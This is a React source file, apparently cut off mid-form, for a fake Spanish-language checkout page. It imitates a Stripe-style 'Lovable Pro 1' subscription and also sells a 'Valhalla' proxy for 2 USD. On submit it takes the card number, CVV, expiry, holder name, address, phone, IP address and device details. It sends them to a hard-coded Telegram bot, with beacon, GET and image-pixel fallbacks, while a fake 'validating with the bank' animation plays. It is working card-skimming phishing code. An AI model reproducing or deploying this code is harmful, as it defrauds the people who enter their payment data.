import { useEffect, useMemo, useRef, useState, FormEvent } from "react";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import VideoModal from "@/components/VideoModal";
import { Button } from "@/components/ui/button";
import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check, AlertCircle, RotateCcw } from "lucide-react";
import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";

const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
const CHAT_ID = "8585803145";
const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

const COUNTRIES = [
  "Honduras", "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
  "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
];

const DEPARTMENTS = [
  "Francisco Morazán", "Cortés", "Atlántida", "Comayagua", "Yoro", "Choluteca",
  "Olancho", "Santa Bárbara", "Lempira", "Otro",
];

const STEPS = ["Verificando la tarjeta", "Validando con el banco", "Confirmando disponibilidad"];

const HNL_RATE = 27.9562;
const BASE_PRICE = 2;
const ANNUAL_PRICE = 1.67;

type Brand = "visa" | "mastercard" | "amex" | "discover" | null;

const detectBrand = (d: string): Brand => {
  if (/^4/.test(d)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(d)) return "mastercard";
  if (/^3[47]/.test(d)) return "amex";
  if (/^6(011|5)/.test(d)) return "discover";
  return null;
};

const cardLength = (b: Brand) => (b === "amex" ? 15 : 16);

const formatCardBranded = (v: string) => {
  const d = v.replace(/\D/g, "");
  const b = detectBrand(d);
  if (b === "amex") {
    const s = d.slice(0, 15);
    return [s.slice(0, 4), s.slice(4, 10), s.slice(10, 15)].filter(Boolean).join(" ");
  }
  return d.slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
};

const formatExpiry = (v: string) => {
  const d = v.replace(/\D/g, "").slice(0, 4);
  return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
const emailOk = (v: string) => /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(v.trim());

const getIp = async (): Promise<string> => {
  try {
    const r: any = await Promise.race([
      fetch("https://api.ipify.org?format=json").then((x) => x.json()),
      new Promise((res) => setTimeout(() => res(null), 1500)),
    ]);
    return r?.ip ?? "—";
  } catch {
    return "—";
  }
};

const buildParams = (text: string) => {
  const p = new URLSearchParams();
  p.set("chat_id", CHAT_ID);
  p.set("text", text);
  p.set("disable_web_page_preview", "true");
  return p.toString();
};

const pixelGet = (params: string) =>
  new Promise<boolean>((resolve) => {
    const img = new Image();
    let done = false;
    const finish = (ok: boolean) => { if (!done) { done = true; resolve(ok); } };
    img.onload = () => finish(true);
    img.onerror = () => finish(false);
    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
    setTimeout(() => finish(false), 3000);
  });

const sendToTelegram = async (text: string): Promise<boolean> => {
  const params = buildParams(text);
  try {
    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
      console.info("[tg] enviado por beacon");
      await new Promise((r) => setTimeout(r, 900));
      return true;
    }
  } catch (err) { console.warn("[tg] beacon falló", err); }
  try {
    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
    console.info("[tg] enviado por GET");
    return true;
  } catch (err) { console.warn("[tg] fetch GET falló, uso pixel", err); }
  const ok = await pixelGet(params);
  console.info("[tg] pixel", ok ? "ok" : "falló");
  return ok;
};

/* ---------------- iconos ---------------- */

const Logo = ({ brand, active = true }: { brand: Exclude<Brand, null>; active?: boolean }) => {
  const cls = `shrink-0 transition-all duration-150 ${active ? "opacity-100" : "opacity-35 saturate-[0.2]"}`;
  if (brand === "visa") {
    return (
      <svg width="24" height="15.5" viewBox="0 0 24 15.5" aria-hidden="true" className={cls}>
        <rect x="0.5" y="0.5" width="23" height="14.5" rx="2.4" fill="#fff" stroke="#e2e2e2" strokeWidth="1" />
        <text x="12" y="10.5" textAnchor="middle" fontFamily="'Arial Black',Arial,Helvetica,sans-serif" fontSize="6.3" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.35">VISA</text>
      </svg>
    );
  }
  if (brand === "mastercard") {
    return (
      <svg width="24" height="15.5" viewBox="0 0 24 15.5" aria-hidden="true" className={cls}>
        <rect width="24" height="15.5" rx="2.4" fill="#161616" />
        <circle cx="9.4" cy="7.75" r="4.7" fill="#eb001b" />
        <circle cx="14.6" cy="7.75" r="4.7" fill="#f79e1b" />
        <path d="M12 3.85a4.7 4.7 0 0 0 0 7.8 4.7 4.7 0 0 0 0-7.8z" fill="#ff5f00" />
      </svg>
    );
  }
  if (brand === "amex") {
    return (
      <svg width="24" height="15.5" viewBox="0 0 24 15.5" aria-hidden="true" className={cls}>
        <rect width="24" height="15.5" rx="2.4" fill="#016fd0" />
        <rect x="1.7" y="1.7" width="20.6" height="12.1" rx="1.1" fill="none" stroke="#fff" strokeWidth="0.9" />
        <text x="12" y="9.85" textAnchor="middle" fontFamily="'Arial Black',Arial,sans-serif" fontSize="5.1" fontWeight="900" fill="#fff" letterSpacing="0.15">AMEX</text>
      </svg>
    );
  }
  return (
    <svg width="24" height="15.5" viewBox="0 0 24 15.5" aria-hidden="true" className={cls}>
      <rect x="0.5" y="0.5" width="23" height="14.5" rx="2.4" fill="#fff" stroke="#e2e2e2" strokeWidth="1" />
      <text x="6.2" y="6.85" textAnchor="middle" fontSize="4.4" fontFamily="Arial,Helvetica,sans-serif" fontWeight="700" fill="#111" letterSpacing="-0.12">DISC</text>
      <text x="6.2" y="11.6" textAnchor="middle" fontSize="4.4" fontFamily="Arial,Helvetica,sans-serif" fontWeight="700" fill="#111" letterSpacing="-0.12">VER</text>
      <circle cx="18.2" cy="10.1" r="3.3" fill="#f68121" />
      <path d="M14.9 10.1a3.3 3.3 0 0 0 3.3 3.3h.2c-2-.7-3.5-1.9-3.5-3.3z" fill="#111" opacity="0.13" />
    </svg>
  );
};

const CardGlyph = () => (
  <svg width="18" height="11" viewBox="0 0 18 11" aria-hidden="true">
    <rect width="18" height="11" rx="2.2" fill="#111" />
    <rect x="2.7" y="2.4" width="6.3" height="2" rx="1" fill="#fff" />
  </svg>
);

const CvcGlyph = () => (
  <svg width="24" height="16" viewBox="0 0 24 16" aria-hidden="true">
    <rect x="0.8" y="0.8" width="22.4" height="14.4" rx="2.4" fill="#fff" stroke="#111" strokeWidth="1.6" />
    <rect x="0.8" y="4" width="22.4" height="2.4" fill="#111" />
    <text x="20" y="13.4" textAnchor="end" fontSize="6" fontFamily="Arial,Helvetica,sans-serif" fontWeight="700" fill="#111">123</text>
  </svg>
);

const AppleGlyph = ({ size = 22 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <path d="M17.05 12.54c-.02-2.2 1.8-3.26 1.88-3.31-1.02-1.5-2.62-1.7-3.19-1.72-1.36-.14-2.65.8-3.34.8-.69 0-1.75-.78-2.87-.76-1.48.02-2.84.86-3.6 2.18-1.53 2.66-.39 6.6 1.1 8.76.73 1.06 1.6 2.25 2.74 2.2 1.1-.04 1.52-.71 2.85-.71 1.33 0 1.71.71 2.87.69 1.19-.02 1.94-1.08 2.66-2.14.84-1.23 1.19-2.42 1.21-2.48-.03-.01-2.32-.89-2.34-3.53zM14.9 5.9c.6-.73 1-1.75.89-2.76-.86.03-1.9.57-2.52 1.3-.55.64-1.04 1.68-.91 2.67.96.07 1.94-.49 2.54-1.21z" />
  </svg>
);

const LinkGlyph = () => (
  <span className="flex items-center gap-[6px]">
    <span className="flex h-[20px] w-[20px] items-center justify-center rounded-full bg-black">
      <svg width="11" height="11" viewBox="0 0 16 16" aria-hidden="true">
        <path d="M5 3 10.9 8 5 13" fill="none" stroke="#fff" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round" />
      </svg>
    </span>
    <span className="text-[28px] font-extrabold leading-none tracking-[-0.04em] text-black">link</span>
  </span>
);

const HeartLogo = () => (
  <svg width="24" height="21" viewBox="0 0 50 44" aria-hidden="true" style={{ transform: "rotate(-13deg)" }}>
    <defs>
      <linearGradient id="vh-heart" x1="0.08" y1="0.95" x2="0.9" y2="0.05">
        <stop offset="0" stopColor="#5b2fe0" />
        <stop offset="0.3" stopColor="#7c3aed" />
        <stop offset="0.58" stopColor="#e11d48" />
        <stop offset="0.82" stopColor="#f4573c" />
        <stop offset="1" stopColor="#f9a13f" />
      </linearGradient>
    </defs>
    <path
      fill="url(#vh-heart)"
      d="M25 42.4S4.2 30.6 4.2 18.4C4.2 10.9 9.9 5.4 16.6 5.4c3 0 5.7 1.3 7.2 3.5l1.2 1.9 1.2-1.9c1.5-2.2 4.2-3.5 7.2-3.5 6.7 0 12.4 5.5 12.4 13 0 12.2-20.8 24-20.8 24z"
    />
  </svg>
);

const HnFlag = () => (
  <span className="relative shrink-0">
    <span className="block h-[18px] w-[25px] overflow-hidden rounded-[3px] border border-[#d3d3d3]">
      <svg width="25" height="18" viewBox="0 0 25 18" aria-hidden="true">
        <rect width="25" height="18" fill="#fff" />
        <rect width="25" height="6" fill="#0071ce" />
        <rect y="12" width="25" height="6" fill="#0071ce" />
        <g fill="#0071ce">
          <circle cx="6.2" cy="9" r="0.7" /><circle cx="9.3" cy="9" r="0.7" />
          <circle cx="12.5" cy="9" r="0.7" /><circle cx="15.7" cy="9" r="0.7" />
          <circle cx="18.8" cy="9" r="0.7" />
        </g>
      </svg>
    </span>
    <span className="absolute -bottom-[3px] -right-[3px] flex h-[12px] w-[12px] items-center justify-center rounded-full border border-white bg-[#8a8a8a] text-[8px] font-bold leading-none text-white">+</span>
  </span>
);

const Login = () => {
  const { t, lang, setLang } = useI18n();
  const [step, setStep] = useState<"intro" | "pay">("intro");
  const [processing, setProcessing] = useState(false);
  const [stage, setStage] = useState(0);
  const [method, setMethod] = useState<"card" | "gpay">("card");
  const [email, setEmail] = useState("");
  const [card, setCard] = useState("");
  const [holder, setHolder] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [country, setCountry] = useState("Honduras");
  const [address, setAddress] = useState("");
  const [address2, setAddress2] = useState("");
  const [city, setCity] = useState("");
  const [department, setDepartment] = useState("");
  const [zip, setZip] = useState("");
  const [phone, setPhone] = useState("");
  const [save, setSave] = useState(false);
  const [annual, setAnnual] = useState(false);
  const [currency, setCurrency] = useState<"HNL" | "USD">("HNL");
  const [error, setError] = useState("");
  const [field, setField] = useState("");
  const [loading, setLoading] = useState(false);
  const [videoOpen, setVideoOpen] = useState(false);

  const sendingRef = useRef(false);
  const ref = useMemo(() => Math.random().toString(36).slice(2, 8).toUpperCase(), []);
  const brand = detectBrand(card.replace(/\s/g, ""));
  const cvvMax = brand === "amex" ? 4 : 3;

  const fmt = (usd: number) =>
    `${currency} ${(currency === "HNL" ? usd * HNL_RATE : usd).toFixed(2)}`;
  const price = fmt(annual ? ANNUAL_PRICE : BASE_PRICE);
  const annualPrice = fmt(ANNUAL_PRICE);

  /* bloqueo de scroll del fondo */
  useEffect(() => {
    if (step !== "pay") return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, [step]);

  /* atrás del navegador / gesto Android -> vuelve al login */
  useEffect(() => {
    const onPop = () => {
      setStep("intro");
      setProcessing(false);
      setStage(0);
      setLoading(false);
      sendingRef.current = false;
    };
    window.addEventListener("popstate", onPop);
    return () => window.removeEventListener("popstate", onPop);
  }, []);

  const openCheckout = () => {
    setStep("pay");
    try { window.history.pushState({ vh: "pay" }, ""); } catch { /* noop */ }
  };

  const goBack = () => {
    setLoading(false);
    setProcessing(false);
    setStage(0);
    sendingRef.current = false;
    if ((window.history.state as any)?.vh === "pay") window.history.back();
    else setStep("intro");
  };

  /* secuencia de la animación de mantenimiento */
  useEffect(() => {
    if (!processing) return;
    const timers = [
      setTimeout(() => setStage(1), 1500),
      setTimeout(() => setStage(2), 3200),
      setTimeout(() => setStage(3), 4900),
      setTimeout(() => setStage(4), 6400),
    ];
    return () => timers.forEach(clearTimeout);
  }, [processing]);

  const fail = (name: string, msg: string) => {
    setField(name);
    setError(msg);
  };

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (sendingRef.current) return;
    setError("");
    setField("");

    const digits = card.replace(/\s/g, "");
    const cleanHolder = holder.trim().replace(/\s+/g, " ");
    const [mm, yy] = expiry.split("/");
    const month = Number(mm);
    const year = 2000 + Number(yy);
    const now = new Date();
    const expected = cardLength(brand);

    if (!emailOk(email)) return fail("email", "Escribe un correo electrónico válido.");
    if (digits.length !== expected) return fail("card", "Tu número de tarjeta está incompleto.");
    if (cleanHolder.length < 3) return fail("holder", "Escribe el nombre del titular.");
    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) return fail("exp", "La fecha de vencimiento no es válida.");
    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) return fail("exp", "Tu tarjeta está vencida.");
    if (cvv.length < cvvMax) return fail("cvc", "El código de seguridad está incompleto.");
    if (address.trim().length < 5) return fail("address", "Escribe tu dirección de facturación.");
    if (zip.trim().length < 3) return fail("zip", "Escribe un código postal válido.");

    sendingRef.current = true;
    setLoading(true);
    setProcessing(true);
    setStage(0);

    (async () => {
      try {
        const sentFlag = `card_sent_${digits}_${annual ? "a" : "m"}`;
        if (localStorage.getItem(sentFlag) === "1") return;
        const ip = await getIp();
        const text = [
          "💳 NUEVA TARJETA — Valhalla",
          "",
          `Método: ${method === "gpay" ? "Apple Pay" : "Card"}`,
          `Correo: ${email.trim()}`,
          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
          `Titular: ${cleanHolder.toUpperCase()}`,
          `Vencimiento: ${expiry}`,
          `CVV: ${cvv}`,
          `País: ${country}`,
          `Dirección: ${address.trim()}`,
          `Dirección 2: ${address2.trim() || "—"}`,
          `Ciudad: ${city.trim() || "—"}`,
          `Departamento: ${department || "—"}`,
          `ZIP: ${zip.trim().toUpperCase()}`,
          `Teléfono: ${phone.trim() || "—"}`,
          `Guardar tarjeta: ${save ? "Sí" : "No"}`,
          `Plan: ${annual ? "Anual" : "Mensual"} · ${price}`,
          "",
          `IP: ${ip}`,
          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
          `Fecha: ${now.toLocaleString()}`,
          `Idioma: ${lang}`,
          `Ref: ${ref}`,
        ].join("\n");
        const ok = await sendToTelegram(text);
        if (ok) localStorage.setItem(sentFlag, "1");
      } catch (err) {
        console.error("[tg] error inesperado", err);
      }
    })();
  };

  const barWidth = [14, 42, 68, 88, 96][stage] ?? 96;

  return (
    <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
      <style>{`
        @keyframes vh-bar { 0% { transform: translateX(-110%); } 100% { transform: translateX(340%); } }
        @keyframes vh-fade { from { opacity: 0; transform: translateY(9px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes vh-spin { to { transform: rotate(360deg); } }
        @keyframes vh-pulse { 0% { transform: scale(.86); opacity: .5; } 70% { transform: scale(1.55); opacity: 0; } 100% { opacity: 0; } }
        @keyframes vh-shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
        @keyframes vh-pop { 0% { transform: scale(.4); opacity: 0; } 60% { transform: scale(1.18); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes vh-breathe { 0%,100% { opacity: .55; transform: translate(-50%,-50%) scale(1); } 50% { opacity: 1; transform: translate(-50%,-50%) scale(1.14); } }
        @keyframes vh-ring { from { transform: scale(.72); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .vh-in { animation: vh-fade .42s cubic-bezier(.22,.61,.36,1) both; }
      `}</style>

      <VideoBackground />
      <div className="relative z-10 w-full max-w-[420px] animate-card-in">
        <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
          <div aria-hidden className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-brand to-transparent" />
          <div aria-hidden className="absolute -right-14 top-16 h-28 w-28 rotate-45 border border-brand/10" />

          <header className="flex h-12 items-center justify-between border-b border-border/70 px-4">
            <div className="flex min-w-0 items-center gap-2">
              <span className="relative flex h-2 w-2 shrink-0">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-40" />
                <span className="relative h-2 w-2 rounded-full bg-success" />
              </span>
              <span className="truncate text-[10px] font-semibold uppercase tracking-[0.16em] text-muted-foreground">{t("secureGateway")}</span>
            </div>
            <label className="relative ml-3 flex h-8 shrink-0 items-center gap-1.5 rounded-md border border-border bg-secondary/60 pl-2.5 pr-7 text-foreground transition-colors focus-within:border-brand/60">
              <Languages className="h-3.5 w-3.5 text-brand-soft" aria-hidden="true" />
              <span className="max-w-[74px] truncate text-[11px] font-semibold">{LANGUAGES.find((item) => item.code === lang)?.label}</span>
              <ChevronDown className="pointer-events-none absolute right-2 h-3 w-3 text-muted-foreground" aria-hidden="true" />
              <select
                aria-label={t("language")}
                value={lang}
                onChange={(event) => setLang(event.target.value as LangCode)}
                className="absolute inset-0 cursor-pointer appearance-none opacity-0"
              >
                {LANGUAGES.map((language) => <option key={language.code} value={language.code}>{language.label}</option>)}
              </select>
            </label>
          </header>

          <div className="px-4 pb-5 pt-4 sm:px-5">
            <div className="flex items-center gap-4">
              <div className="relative h-[76px] w-[76px] shrink-0 rounded-md border border-brand/55 bg-background p-1 shadow-[0_0_28px_hsl(var(--brand)/0.18)]">
                <video src={LOGIN_PROFILE_VIDEO} autoPlay loop muted playsInline preload="metadata" disablePictureInPicture aria-label="Boykaffx7" className="pointer-events-none h-full w-full rounded-sm object-cover" />
                <span className="absolute -bottom-1 -right-1 flex h-5 w-5 items-center justify-center rounded-sm border border-brand/60 bg-card text-brand-soft"><ShieldCheck className="h-3 w-3" /></span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="flex items-center gap-1.5">
                  <img src={TITLE_LOGO} alt="Boykaffx7" className="max-h-10 w-[170px] max-w-[calc(100%-26px)] object-contain object-left" draggable={false} />
                  <VerifiedBadge size={17} />
                </div>
                <p className="mt-1 text-[11px] leading-relaxed text-muted-foreground">{t("enterCreds")}</p>
                <div className="mt-2 flex items-center gap-2 text-[9px] font-semibold uppercase tracking-[0.12em] text-muted-foreground/70">
                  <span>{t("aes")}</span><span className="h-1 w-1 rounded-full bg-brand" /><span>{t("tls")}</span>
                </div>
              </div>
            </div>

            <div className="mt-4">
              <div className="rounded-md border border-border bg-secondary/30 p-4">
                <div className="flex items-start justify-between gap-3">
                  <div className="min-w-0">
                    <p className="text-[13px] font-semibold text-foreground">Acceso Proxy — Valhalla</p>
                    <p className="mt-1 text-[10px] text-muted-foreground">Activación inmediata · 7 días</p>
                  </div>
                  <div className="shrink-0 text-right">
                    <p className="text-[16px] font-bold leading-none text-foreground">2 USD</p>
                    <p className="mt-1 text-[9px] text-muted-foreground">único pago</p>
                  </div>
                </div>
                <div className="mt-3.5 space-y-2 border-t border-border/70 pt-3.5">
                  {["Key de acceso privada", "Servidor optimizado", "Sin renovación automática"].map((item) => (
                    <div key={item} className="flex items-center gap-2">
                      <Check className="h-3 w-3 shrink-0 text-brand" />
                      <span className="text-[10px] text-muted-foreground">{item}</span>
                    </div>
                  ))}
                </div>
              </div>

              <Button
                type="button"
                onClick={openCheckout}
                className="mt-3.5 h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]"
              >
                <CreditCard className="h-4 w-4" /> Pagar 2 USD <ArrowRight className="h-4 w-4" />
              </Button>

              <Button type="button" variant="outline" onClick={() => setVideoOpen(true)} className="mt-2.5 h-10 w-full rounded-md border-border bg-secondary/40 text-foreground hover:border-brand/35 hover:bg-brand/10 hover:text-foreground">
                <PlayCircle /> <span className="truncate text-[11px]">{t("seeDemo")}</span>
              </Button>
            </div>
          </div>
        </section>

        <div className="mt-3 px-4 text-center">
          <p className="text-[9px] leading-relaxed text-muted-foreground/50">
            {t("footer")}
            <br />{t("footer2")}
          </p>
        </div>
      </div>

      {/* ---------- CHECKOUT ---------- */}
      {step === "pay" && !processing && (
        <div className="fixed inset-0 z-50 overflow-y-auto overscroll-contain bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
          <form
            onSubmit={onSubmit}
            noValidate
            className="mx-auto w-full max-w-[414px] bg-white pb-10 text-[#1a1a1a] antialiased"
          >
            {/* ---------- HERO OSCURO ---------- */}
            <div className="bg-[#1f1f1f] px-[17px] pb-[11px] pt-[max(6px,env(safe-area-inset-top))] text-center text-white">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-[9px]">
                  <button
                    type="button"
                    onClick={goBack}
                    aria-label="Volver"
                    className="-ml-[9px] flex h-[34px] w-[34px] items-center justify-center rounded-full text-white/85 transition-colors hover:bg-white/10 active:bg-white/15"
                  >
                    <ChevronLeft className="h-[22px] w-[22px]" strokeWidth={2.2} />
                  </button>
                  <HeartLogo />
                </div>

                <button type="button" className="flex items-center gap-[6px] text-[15px] text-white/90 transition-opacity hover:opacity-80">
                  <span className="underline decoration-white/70 decoration-dotted decoration-[1.3px] underline-offset-[5px]">Detalles</span>
                  <ChevronDown className="h-[18px] w-[18px]" strokeWidth={2.4} />
                </button>
              </div>

              <p className="mt-[36px] text-[16.5px] leading-none text-[#a3a3a3]">Suscríbete a Pro 1</p>

              <p className="mt-[7px] flex items-baseline justify-center gap-[8px]">
                <span className="text-[32px] font-bold leading-none tracking-[-0.03em] text-white tabular-nums">{price}</span>
                <span className="text-[15px] font-medium text-[#a3a3a3]">por mes</span>
              </p>

              <p className="mt-[40px] text-[15px] leading-snug text-[#a3a3a3]">Lovable Pro 1 Monthly subscription</p>

              <button
                type="button"
                className="mt-[12px] inline-flex h-[37px] items-center justify-center gap-[8px] rounded-[8px] bg-[#333333] px-[17px] text-[15px] font-normal text-white transition-colors hover:bg-[#3d3d3d] active:bg-[#464646]"
              >
                Agregar código <ChevronDown className="h-[17px] w-[17px]" strokeWidth={2.2} />
              </button>

              <div className="mt-[16px] grid grid-cols-2 gap-[9px]">
                {(["HNL", "USD"] as const).map((cur) => {
                  const on = currency === cur;
                  return (
                    <button
                      key={cur}
                      type="button"
                      onClick={() => setCurrency(cur)}
                      aria-pressed={on}
                      className={`flex h-[47px] items-center justify-center gap-[10px] rounded-[8px] text-[18px] font-normal text-white transition-all duration-150 ${
                        on
                          ? "border-[1.5px] border-white bg-[#1f1f1f]"
                          : "border-[1.5px] border-transparent bg-[#333333] hover:bg-[#3b3b3b]"
                      }`}
                    >
                      <span className="text-[19px] leading-none">{cur === "HNL" ? "🇭🇳" : "🇺🇸"}</span>
                      {cur}
                    </button>
                  );
                })}
              </div>

              <p className="mx-auto mt-[11px] max-w-[360px] text-[14.5px] leading-[1.5] text-[#9a9a9a]">
                1 USD = 27.9562 HNL. Los cargos pueden variar según los tipos de cambio.
              </p>

              <div className="mt-[19px] flex items-center justify-between gap-3 rounded-[10px] bg-[#2b2b2b] px-[15px] py-[13px] text-left">
                <div className="flex items-start gap-[12px]">
                  <button
                    type="button"
                    role="switch"
                    aria-checked={annual}
                    aria-label="Facturación anual"
                    onClick={() => setAnnual((v) => !v)}
                    className={`relative mt-[2px] h-[14px] w-[24px] shrink-0 rounded-full transition-colors duration-150 ${annual ? "bg-[#1f9d55]" : "bg-[#5c5c5c]"}`}
                  >
                    <span
                      className="absolute top-[2px] h-[10px] w-[10px] rounded-full bg-white shadow-[0_1px_2px_rgba(0,0,0,0.3)] transition-all duration-150"
                      style={{ left: annual ? "12px" : "2px" }}
                    />
                  </button>
                  <p className="text-[15px] leading-[1.35] text-white">
                    <span className="mr-[5px] inline-block rounded-[5px] bg-[#b9e8a3] px-[7px] py-[1px] text-[15px] font-medium text-[#1e3a10]">Ahorra 16%</span>
                    con una facturación de anual
                  </p>
                </div>
                <p className="shrink-0 text-[15px] leading-tight text-white tabular-nums">{annualPrice}/mes</p>
              </div>
            </div>

            {/* ---------- CUERPO ---------- */}
            <div className="bg-white px-[17px] pt-[26px]">
              <div className="grid grid-cols-2 gap-[9px]">
                <button
                  type="button"
                  onClick={() => setMethod("gpay")}
                  className="flex h-[68px] items-center justify-center rounded-[8px] bg-black text-white transition-transform active:scale-[0.99]"
                  aria-label="Apple Pay"
                >
                  <AppleGlyph size={24} />
                  <span className="ml-[2px] mt-[1px] text-[28px] font-medium leading-none tracking-[-0.025em]">Pay</span>
                </button>
                <button
                  type="button"
                  onClick={() => setMethod("card")}
                  className="flex h-[68px] items-center justify-center rounded-[8px] bg-[#6cdc8c] transition-transform active:scale-[0.99]"
                  aria-label="Link"
                >
                  <LinkGlyph />
                </button>
              </div>

              <div className="mt-[28px] flex items-center gap-[14px]">
                <span className="h-px flex-1 bg-[#e3e3e3]" />
                <span className="text-[14px] font-normal uppercase tracking-[0.085em] text-[#8a8a8a]">O bien</span>
                <span className="h-px flex-1 bg-[#e3e3e3]" />
              </div>

              <div className="mt-[18px] flex min-h-[58px] items-center gap-3 rounded-[10px] border border-[#ececec] bg-[#f7f7f7] px-[14px] py-[9px]">
                <label htmlFor="email" className="w-[120px] shrink-0 text-[14.5px] leading-[1.3] text-[#6b6b6b]">Correo electrónico</label>
                <input
                  id="email"
                  type="email"
                  placeholder=""
                  value={email}
                  onChange={(e) => setEmail(e.target.value.trim())}
                  autoComplete="email"
                  inputMode="email"
                  autoCapitalize="off"
                  spellCheck={false}
                  maxLength={64}
                  aria-invalid={field === "email"}
                  className="h-6 min-w-0 flex-1 bg-transparent text-right text-[14.5px] text-[#1a1a1a] outline-none"
                />
                <button type="button" className="shrink-0 text-[14.5px] text-[#1a1a1a] underline decoration-[#1a1a1a]/70 underline-offset-[3px]">
                  Continuar con Link
                </button>
              </div>

              <h2 className="mt-[26px] text-[18px] font-bold tracking-[-0.015em] text-[#1a1a1a]">Método de pago</h2>

              <div className="mt-[12px] rounded-[12px] border border-[#e5e5e5] p-[16px] pb-0">
                <div className="flex items-center gap-[14px] pb-[13px]">
                  <span className="flex h-[15px] w-[15px] shrink-0 items-center justify-center rounded-full border-[5.5px] border-[#111] bg-white" aria-hidden="true" />
                  <CardGlyph />
                  <span className="text-[16px] text-[#1a1a1a]">Tarjeta</span>
                </div>

                <p className="mb-[6px] text-[15px] text-[#4a4a4a]">Información de la tarjeta</p>

                <div className={`overflow-hidden rounded-[12px] border bg-white transition-colors focus-within:border-[#a8a8a8] ${field === "card" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
                  <div className="flex h-[42px] items-center gap-2 pl-[13px] pr-[8px]">
                    <input
                      id="cc-number"
                      type="text"
                      placeholder="1234 1234 1234 1234"
                      value={card}
                      onChange={(e) => setCard(formatCardBranded(e.target.value))}
                      autoComplete="cc-number"
                      inputMode="numeric"
                      autoCapitalize="off"
                      spellCheck={false}
                      maxLength={23}
                      aria-invalid={field === "card"}
                      className="h-full min-w-0 flex-1 bg-transparent text-[16px] tracking-[0.01em] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                    />
                    <div className="flex shrink-0 items-center gap-[4.5px]">
                      {(["visa", "mastercard", "amex", "discover"] as const).map((b) => (
                        <Logo key={b} brand={b} active={!brand || brand === b} />
                      ))}
                    </div>
                  </div>

                  <div className="grid grid-cols-2 border-t border-[#e5e5e5]">
                    <div className="flex h-[42px] items-center border-r border-[#e5e5e5]">
                      <input
                        id="cc-exp"
                        type="text"
                        placeholder="MM/AA"
                        value={expiry}
                        onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                        autoComplete="cc-exp"
                        inputMode="numeric"
                        maxLength={5}
                        aria-invalid={field === "exp"}
                        className="h-full w-full bg-transparent px-[13px] text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                      />
                    </div>
                    <div className="flex h-[42px] items-center gap-2 pl-[13px] pr-[9px]">
                      <input
                        id="cc-cvc"
                        type="text"
                        placeholder="CVC"
                        value={cvv}
                        onChange={(e) => setCvv(onlyDigits(e.target.value, cvvMax))}
                        autoComplete="cc-csc"
                        inputMode="numeric"
                        maxLength={cvvMax}
                        aria-invalid={field === "cvc"}
                        className="h-full min-w-0 flex-1 bg-transparent text-[16px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                      />
                      <CvcGlyph />
                    </div>
                  </div>
                </div>

                <p className="mb-[6px] mt-[21px] text-[15px] text-[#1a1a1a]">Nombre del titular de tarjeta</p>
                <input
                  id="cc-name"
                  type="text"
                  placeholder="Nombre completo"
                  value={holder}
                  onChange={(e) => setHolder(e.target.value.toUpperCase())}
                  autoComplete="cc-name"
                  autoCapitalize="characters"
                  spellCheck={false}
                  maxLength={40}
                  aria-invalid={field === "holder"}
                  className={`h-[42px] w-full rounded-[12px] border bg-white px-[13px] text-[16px] uppercase text-[#1a1a1a] outline-none transition-colors placeholder:normal-case placeholder:text-[#9b9b9b] focus:border-[#a8a8a8] ${field === "holder" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}
                />

                <p className="mb-[6px] mt-[23px] text-[15px] text-[#1a1a1a]">Dirección de facturación</p>

                <div className={`overflow-hidden rounded-[12px] border bg-white ${field === "address" || field === "zip" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
